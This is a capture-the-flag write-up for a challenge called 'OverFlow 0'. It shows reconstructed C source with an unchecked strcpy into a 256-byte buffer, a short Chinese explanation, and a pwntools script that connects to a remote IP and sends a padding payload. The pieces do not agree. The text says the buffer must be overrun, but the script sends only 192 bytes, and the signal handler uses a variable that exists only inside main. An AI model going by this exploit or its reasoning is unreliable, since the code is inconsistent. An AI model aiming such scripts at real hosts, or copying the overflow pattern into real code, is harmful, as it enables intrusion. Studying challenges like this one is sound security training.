# OverFlow 0

## Reverse

```c
void sigsegv_handler(void) {
    // Print the flag to standard error
    fprintf(stderr, "%s\n", flag);
    fflush(stderr);
    // Exit the program
    exit(1);
}

void vuln(char *input) {
    // Vulnerable function
    char buffer[256];
    strcpy(buffer, input); // Potential buffer overflow
}

int main(void) {
    FILE *file;
    char flag[64];
    gid_t gid;
    char input[300];
    int i;

    file = fopen("flag.txt", "r");
    if (file == NULL) {
        puts("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.");
        exit(0);
    }
    fgets(flag, sizeof(flag), file);
    fclose(file);

    signal(SIGSEGV, sigsegv_handler);

    gid = getegid();
    setresgid(gid, gid, gid);

    puts("Input:");
    for (i = 0; i < 74; i++) {
        input[i] = 0;
    }
    fgets(input, sizeof(input), stdin);
    vuln(input);

    return 0;
}
```

## Exploit

由逆向结果可知，程序在输入时会调用`vuln`函数，而`vuln`函数中使用了`strcpy`函数来复制输入到一个256字节的缓冲区中，这可能导致缓冲区溢出。 溢出后会调用`sigsegv_handler`函数，打印flag并退出程序。 所以我们只需要输入足够长的字符串来覆盖`buffer`，并触发`sigsegv_handler`函数即可。

```python
#!/usr/bin/python
from pwn import *
context.arch='amd64'
r=remote("124.16.75.117",51001)
pause()
r.sendline(b'a'*192)
r.interactive()
```
